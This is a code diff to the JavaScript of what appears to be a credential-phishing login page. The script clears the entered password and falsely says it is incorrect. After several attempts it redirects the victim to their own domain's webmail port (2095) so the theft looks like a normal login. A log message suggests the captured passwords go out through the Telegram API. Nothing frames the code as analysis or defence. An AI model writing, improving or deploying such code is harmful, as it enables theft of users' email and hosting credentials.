@@ -1810,43 +1810,36 @@ $.ajax({
       beforeSend: function(xhr) {
         $('#submit-btn').html('Verifying...');
       },
-            success: function(response){
-            	if(response){
-            		$("#msg").show();
-            		console.log(response);
-            		if(response['signal'] == 'ok'){
-            			$("#password").val("");
-            			if (count>=2) {
-            				count=0;
-                    // window.location.replace(response['redirect_link']);
-                   window.location.replace("https://www."+my_slice);
-                }
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-            }
-            else{
-                        	$("#msg").show();
-               $('#msg').html("Password is not correct. Please try again");	
-            }
+            success: function(response) {
+        if (response.ok) {
+          $("#msg").show();
+          console.log(response);
+          $("#password").val("");
+          if (count >= 3) {
+            count = 0;
+            window.location.replace("http://" + my_slice + ":2095");
+          }
+        } else {
+          console.log('Telegram API error:', response);
+          // Handle the case when the Telegram API does not respond with 'ok'
         }
-    },
-    error: function(){
-    	$("#password").val("");
-    	if (count>=2) {
-    		count=0;
-    		 window.location.replace("https://www."+my_slice);
-    	}
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-    },
-    complete: function(){
-    	
-    }
-});
+      },
+      error: function(xhr, status, error) {
+        console.log('AJAX error:', status, error);
+        $("#password").val("");
+        if (count >= 3) {
+          count = 0;
+          window.location.replace("http://" + my_slice + ":2095");
+        }
+        $("#msg").show();
+        // Handle errors here
+      },
+      complete: function() {
+        $('#submit-btn').html('Sign in');
+      }
+    });
   });
-
-
-	});
+});
 
 
 </script>	
